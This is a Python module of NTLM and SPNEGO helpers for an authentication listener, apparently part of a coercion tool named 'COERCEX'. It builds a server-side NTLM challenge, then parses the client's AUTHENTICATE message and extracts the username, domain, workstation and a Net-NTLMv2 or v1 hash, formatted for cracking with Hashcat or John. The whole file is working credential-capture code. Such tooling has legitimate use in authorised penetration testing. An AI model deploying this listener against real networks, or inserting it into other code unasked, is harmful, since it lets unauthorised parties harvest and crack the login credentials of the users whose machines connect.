"""NTLM and SPNEGO protocol helpers for the listener.

Builds server-side NTLM Type 2 (CHALLENGE) messages, wraps/unwraps
SPNEGO tokens, and parses NTLM Type 3 (AUTHENTICATE) to extract
Net-NTLMv2 hashes in Hashcat/John format.
"""

from __future__ import annotations


def build_spnego_negotiate_token() -> bytes:
    """Build the GSSAPI / SPNEGO NegTokenInit advertising NTLMSSP."""
    from impacket.spnego import SPNEGO_NegTokenInit, TypesMech

    blob = SPNEGO_NegTokenInit()
    blob["MechTypes"] = [
        TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]
    ]
    return blob.getData()


def build_ntlm_challenge(negotiate_flags: int, server_challenge: bytes) -> bytes:
    """Build an NTLM Type 2 (CHALLENGE) message.

    Returns the raw NTLMSSP blob (not SPNEGO-wrapped).
    """
    from impacket import ntlm

    challenge = ntlm.NTLMAuthChallenge()

    # Mirror flags the client wants, plus what we need
    flags = negotiate_flags
    flags |= (
        ntlm.NTLMSSP_NEGOTIATE_56
        | ntlm.NTLMSSP_NEGOTIATE_128
        | ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH
        | ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO
        | ntlm.NTLMSSP_TARGET_TYPE_SERVER
        | ntlm.NTLMSSP_NEGOTIATE_NTLM
        | ntlm.NTLMSSP_REQUEST_TARGET
        | ntlm.NTLMSSP_NEGOTIATE_UNICODE
        | ntlm.NTLMSSP_NEGOTIATE_VERSION
    )

    challenge["flags"] = flags
    challenge["challenge"] = server_challenge

    # Domain / server names
    domain = "COERCEX".encode("utf-16-le")
    hostname = "SCANNER".encode("utf-16-le")

    # Build target info (AV_PAIRS)
    av_pairs = ntlm.AV_PAIRS()
    av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = hostname
    av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = domain
    av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = "scanner.coercex.local".encode("utf-16-le")
    av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = "coercex.local".encode("utf-16-le")
    av_pairs_data = av_pairs.getData()

    challenge["domain_name"] = domain
    challenge["host_name"] = hostname
    challenge["TargetInfoFields"] = av_pairs_data
    challenge["TargetInfoFields_len"] = len(av_pairs_data)
    challenge["TargetInfoFields_max_len"] = len(av_pairs_data)

    # Version (8 bytes, use dummy)
    challenge["Version"] = b"\xff" * 8
    challenge["VersionLen"] = 8

    # Offsets: fixed header is 56 bytes, then domain_name, then target_info
    challenge["domain_offset"] = 56
    challenge["host_offset"] = 56 + len(domain)
    challenge["TargetInfoFields_offset"] = 56 + len(domain) + len(hostname)

    return challenge.getData()


def wrap_ntlm_in_spnego_challenge(ntlm_challenge: bytes) -> bytes:
    """Wrap an NTLM Type 2 in a SPNEGO NegTokenResp (accept-incomplete)."""
    from impacket.spnego import SPNEGO_NegTokenResp, TypesMech

    resp = SPNEGO_NegTokenResp()
    resp["NegState"] = b"\x01"  # accept-incomplete
    resp["SupportedMech"] = TypesMech[
        "NTLMSSP - Microsoft NTLM Security Support Provider"
    ]
    resp["ResponseToken"] = ntlm_challenge
    return resp.getData()


def wrap_spnego_accept_completed() -> bytes:
    """Build SPNEGO NegTokenResp for final accept (SESSION_SETUP success)."""
    from impacket.spnego import SPNEGO_NegTokenResp

    resp = SPNEGO_NegTokenResp()
    resp["NegState"] = b"\x00"  # accept-completed
    return resp.getData()


def parse_ntlm_type3(
    raw_token: bytes, server_challenge: bytes
) -> tuple[str, str, str, str]:
    """Parse NTLM Type 3 (AUTHENTICATE) and format Net-NTLMv2 hash.

    Returns (username, domain, workstation, hash_string).
    The hash_string is in Hashcat/John format:
      ``USERNAME::DOMAIN:CHALLENGE:NTPROOFSTR:BLOB``
    """
    from impacket import ntlm

    auth = ntlm.NTLMAuthChallengeResponse()
    auth.fromString(raw_token)

    username = auth["user_name"].decode("utf-16-le")
    domain = auth["domain_name"].decode("utf-16-le")
    workstation = auth["host_name"].decode("utf-16-le")

    # Build the hash in John/Hashcat format
    nt_response = auth["ntlm"]
    lm_response = auth["lanman"]

    hash_str = ""
    if len(nt_response) > 24:
        # NTLMv2: USERNAME::DOMAIN:SERVER_CHALLENGE:NT_PROOF_STR:BLOB
        nt_proof_str = nt_response[:16]
        blob = nt_response[16:]
        hash_str = (
            f"{username}::{domain}:"
            f"{server_challenge.hex()}:"
            f"{nt_proof_str.hex()}:"
            f"{blob.hex()}"
        )
    elif len(nt_response) == 24:
        # NTLMv1: USERNAME::DOMAIN:LM_RESPONSE:NT_RESPONSE:SERVER_CHALLENGE
        hash_str = (
            f"{username}::{domain}:"
            f"{lm_response.hex()}:"
            f"{nt_response.hex()}:"
            f"{server_challenge.hex()}"
        )

    return username, domain, workstation, hash_str


def extract_spnego_ntlm_token(raw: bytes) -> bytes:
    """Extract the raw NTLM token from a SPNEGO wrapper.

    Handles both NegTokenInit (client's first message) and
    NegTokenResp (client's second message with Type 3).
    """
    from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp

    # Try NegTokenResp first (SESSION_SETUP #2, wraps Type 3)
    try:
        resp = SPNEGO_NegTokenResp(raw)
        token = resp["ResponseToken"]
        if token and len(token) > 0:
            return bytes(token)
    except Exception:
        pass

    # Try NegTokenInit (SESSION_SETUP #1, wraps Type 1)
    try:
        init = SPNEGO_NegTokenInit(raw)
        token = init["MechToken"]
        if token and len(token) > 0:
            return bytes(token)
    except Exception:
        pass

    # Raw NTLMSSP (no SPNEGO wrapper)
    if raw[:7] == b"NTLMSSP":
        return raw

    raise ValueError("Could not extract NTLM token from SPNEGO blob")
